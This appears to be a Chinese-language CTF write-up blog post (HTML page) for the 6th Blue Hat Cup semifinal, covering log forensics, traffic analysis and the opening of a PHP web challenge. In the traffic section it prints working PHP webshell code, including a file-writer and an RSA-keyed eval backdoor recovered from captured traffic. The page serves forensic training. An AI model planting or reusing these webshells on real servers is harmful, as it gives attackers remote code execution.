+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/&name=第六届蓝帽杯全国大学生网络安全技能大赛半决赛Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/&t=第六届蓝帽杯全国大学生网络安全技能大赛半决赛Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E5%B1%8A%E2%80%9D%E8%93%9D%E5%B8%BD%E6%9D%AF%E2%80%9C%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9B-Writeups"><span class="toc-number">1.</span> <span class="toc-text">第六届”蓝帽杯“全国大学生网络安全技能大赛半决赛 Writeups</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%A5%9E%E7%A7%98%E7%9A%84%E6%97%A5%E5%BF%97"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. 神秘的日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8A%A0%E5%AF%86%E7%9A%84%E9%80%9A%E9%81%93"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. 加密的通道</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-easyfatfree"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. easyfatfree</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensic"><span class="toc-number">1.3.</span> <span class="toc-text">Forensic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E6%9C%BA%E5%8F%96%E8%AF%81-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">手机取证_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E6%9C%BA%E5%8F%96%E8%AF%81-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">手机取证_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exe%E5%88%86%E6%9E%90-1"><span class="toc-number">1.3.3.</span> <span class="toc-text">exe分析_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exe%E5%88%86%E6%9E%90-2"><span class="toc-number">1.3.4.</span> <span class="toc-text">exe分析_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exe%E5%88%86%E6%9E%90-3"><span class="toc-number">1.3.5.</span> <span class="toc-text">Exe分析_3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exe%E5%88%86%E6%9E%90-4"><span class="toc-number">1.3.6.</span> <span class="toc-text">Exe分析_4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exe%E5%88%86%E6%9E%90-5"><span class="toc-number">1.3.7.</span> <span class="toc-text">exe分析_5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#APK%E5%88%86%E6%9E%90-02"><span class="toc-number">1.3.8.</span> <span class="toc-text">APK分析_02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#APK%E5%88%86%E6%9E%90-03"><span class="toc-number">1.3.9.</span> <span class="toc-text">APK分析_03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#APK%E5%88%86%E6%9E%90-05"><span class="toc-number">1.3.10.</span> <span class="toc-text">APK分析_05</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#APK%E5%88%86%E6%9E%90-07"><span class="toc-number">1.3.11.</span> <span class="toc-text">APK分析_07</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#APK%E5%88%86%E6%9E%90-08"><span class="toc-number">1.3.12.</span> <span class="toc-text">APK分析_08</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#APK%E5%88%86%E6%9E%90-09"><span class="toc-number">1.3.13.</span> <span class="toc-text">APK分析_09</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#APK%E5%88%86%E6%9E%90-11"><span class="toc-number">1.3.14.</span> <span class="toc-text">APK分析_11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#APK%E5%88%86%E6%9E%90-12"><span class="toc-number">1.3.15.</span> <span class="toc-text">APK分析_12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#APK%E5%88%86%E6%9E%90-15"><span class="toc-number">1.3.16.</span> <span class="toc-text">APK分析_15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81-04"><span class="toc-number">1.3.17.</span> <span class="toc-text">服务器取证_04</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81-07"><span class="toc-number">1.3.18.</span> <span class="toc-text">服务器取证_07</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81-14"><span class="toc-number">1.3.19.</span> <span class="toc-text">服务器取证_14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81-15"><span class="toc-number">1.3.20.</span> <span class="toc-text">服务器取证_15</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        第六届蓝帽杯全国大学生网络安全技能大赛半决赛Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ACT</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-08-04T10:00:00.000Z" itemprop="datePublished">2022-08-04</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/Writeup/">Writeup</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/2022/" rel="tag">2022</a>, <a class="tag-link-link" href="/tags/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9B/" rel="tag">第六届蓝帽杯全国大学生网络安全技能大赛半决赛</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="第六届”蓝帽杯“全国大学生网络安全技能大赛半决赛-Writeups"><a href="#第六届”蓝帽杯“全国大学生网络安全技能大赛半决赛-Writeups" class="headerlink" title="第六届”蓝帽杯“全国大学生网络安全技能大赛半决赛 Writeups"></a>第六届”蓝帽杯“全国大学生网络安全技能大赛半决赛 Writeups</h1><blockquote>
+<p>By ACT Team. 2022.8.4</p>
+</blockquote>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1-神秘的日志"><a href="#1-神秘的日志" class="headerlink" title="1. 神秘的日志"></a>1. 神秘的日志</h3><p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/1.PNG" alt="日志"></p>
+<p>给了两个日志文件，首先在系统日志中筛选ID为6038的NTLM身份验证事件，然后根据筛选结果的第二条的时间2022&#x2F;4&#x2F;17 11:27:06去安全日志中查询相同时间的登录日志</p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/2.PNG" alt="日志"></p>
+<p>找到这条登录日志后在下方的详细信息中奖SystemTime的字符串复制进行md5计算就是flag值</p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/3.PNG" alt="3"></p>
+<p>flag{dafd0428f634aefd1ddb26f8257c791f}</p>
+<h3 id="2-加密的通道"><a href="#2-加密的通道" class="headerlink" title="2. 加密的通道"></a>2. 加密的通道</h3><p>分析流量数据包，发现大马（shell连接管理工具）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$opdir</span>=@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$opdir</span>) &#123;</span><br><span class="line">	<span class="variable">$ocwd</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">	<span class="variable">$oparr</span>=<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/;|:/&quot;</span>,<span class="variable">$opdir</span>);</span><br><span class="line">	@<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>,<span class="variable">$ocwd</span>,<span class="title function_ invoke__">sys_get_temp_dir</span>());</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>)) &#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		;</span><br><span class="line">		<span class="variable">$tmdir</span>=<span class="variable">$item</span>.<span class="string">&quot;/.04ec7d2d70b2&quot;</span>;</span><br><span class="line">		@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">		<span class="keyword">if</span>(!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>)) &#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		@<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">		@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>);</span><br><span class="line">		<span class="variable">$cntarr</span>=@<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>,<span class="variable">$tmdir</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">			@<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		;</span><br><span class="line">		@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;/&quot;</span>);</span><br><span class="line">		@<span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$output</span>=<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">	<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;4947&quot;</span>.<span class="string">&quot;16eb8&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;0fd21&quot;</span>.<span class="string">&quot;b9b2f&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="variable">$f</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;o8ef400b0da61f&quot;</span>],<span class="number">2</span>));</span><br><span class="line">	<span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&quot;jf85b04afff284&quot;</span>];</span><br><span class="line">	<span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line">	<span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line">	<span class="variable">$buf</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>);<span class="variable">$i</span>+=<span class="number">2</span>)<span class="variable">$buf</span>.=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>,<span class="variable">$i</span>,<span class="number">2</span>));</span><br><span class="line">	<span class="keyword">echo</span>(@<span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$f</span>,<span class="string">&quot;a&quot;</span>),<span class="variable">$buf</span>)?<span class="string">&quot;1&quot;</span>:<span class="string">&quot;0&quot;</span>);</span><br><span class="line">	;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="title function_ invoke__">asoutput</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$D</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;o8ef400b0da61f&quot;</span>],<span class="number">2</span>));</span><br></pre></td></tr></table></figure>
+
+<p>分析代码可知，base64截取两位后字符进行解码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span>@Cat:~$ <span class="built_in">echo</span> <span class="string">&quot;SqQzovcGhwc3R1ZHlfcHJvL1dXVy8=&quot;</span> | <span class="built_in">cut</span> -b 3- | <span class="built_in">base64</span> -d</span><br><span class="line">C:/phpstudy_pro/WWW/</span><br></pre></td></tr></table></figure>
+
+<p>重点关注写<code>rsa.php</code>文件成功的请求，发现写文件操作</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="variable">$f</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;o8ef400b0da61f&quot;</span>],<span class="number">2</span>));</span><br><span class="line">	<span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&quot;jf85b04afff284&quot;</span>];</span><br><span class="line">	<span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line">	<span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line">	<span class="variable">$buf</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>);<span class="variable">$i</span>+=<span class="number">2</span>)<span class="variable">$buf</span>.=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>,<span class="variable">$i</span>,<span class="number">2</span>));</span><br><span class="line">	<span class="keyword">echo</span>(@<span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$f</span>,<span class="string">&quot;a&quot;</span>),<span class="variable">$buf</span>)?<span class="string">&quot;1&quot;</span>:<span class="string">&quot;0&quot;</span>);</span><br><span class="line">	;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提取核心代码，本地环境搭建，写入文件测试，目的是提取<code>rsa.php</code>文件内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span>=<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&quot;b&quot;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$buf</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>);<span class="variable">$i</span>+=<span class="number">2</span>)<span class="variable">$buf</span>.=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>,<span class="variable">$i</span>,<span class="number">2</span>));</span><br><span class="line"><span class="keyword">echo</span>(@<span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$f</span>,<span class="string">&quot;a&quot;</span>),<span class="variable">$buf</span>)?<span class="string">&quot;1&quot;</span>:<span class="string">&quot;0&quot;</span>);</span><br><span class="line">;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180728692.png" alt="提取rsa.php"></p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180739604.png" alt="image-20220804180739604"></p>
+<p>发现有<code>PHPJiaMi</code>的混淆，使用<a target="_blank" rel="noopener" href="https://github.com/wenshui2008/phpjiami_decode">phpjiami_decode</a>进行去混淆（得到代码如下）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;ant&#x27;</span>];</span><br><span class="line"><span class="variable">$pk</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDieYmLtWbGRSvUtevSlTOozmWR</span></span><br><span class="line"><span class="string">qEGF4Hfvb1YCoVYAAlhnHnyMk+aLRvLXKgmerWiS+QD6y08Ispuzzn02tHE6d4Qp</span></span><br><span class="line"><span class="string">DuPiPO9PAdGSXzFVFLK2hOrkXLsDXugNTdVUprdkPPI1YY0ZnMs1bT2Zf2dfuBI5</span></span><br><span class="line"><span class="string">0S5e5sSOF85kNq/zwwIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="variable">$cmds</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>, <span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$pk</span> = <span class="title function_ invoke__">openssl_pkey_get_public</span>(<span class="variable">$pk</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$cmds</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">openssl_public_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$value</span>), <span class="variable">$de</span>, <span class="variable">$pk</span>)) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> .= <span class="variable">$de</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">openssl_public_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>), <span class="variable">$de</span>, <span class="variable">$pk</span>)) &#123;</span><br><span class="line">     <span class="variable">$_POST</span>[<span class="variable">$k</span>]=<span class="variable">$de</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$cmd</span>); </span><br></pre></td></tr></table></figure>
+
+<p>添加了<code>rsa.php</code>后，通过新加密又写入<code>flag.txt</code>文件，结合上面脚本，构造流量包的请求（代码添加辅助调试信息）：</p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804181457776.png" alt="得到flag.txt"></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-easyfatfree"><a href="#1-easyfatfree" class="headerlink" title="1. easyfatfree"></a>1. easyfatfree</h3><p>通过扫描，发现<code>www.zip</code>网站源码</p>
+<p><code>index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Kickstart the framework</span></span><br><span class="line"><span class="variable">$f3</span>=<span class="keyword">require</span>(<span class="string">&#x27;lib/base.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">float</span>)PCRE_VERSION&lt;<span class="number">8.0</span>)</span><br><span class="line">    <span class="title function_ invoke__">trigger_error</span>(<span class="string">&#x27;PCRE version is out of date&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;<span class="title function_ invoke__">route</span>(<span class="string">&#x27;GET /&#x27;</span>,</span><br><span class="line">    function(<span class="variable">$f3</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;easyfatfree unserialize me&quot;</span>;</span><br><span 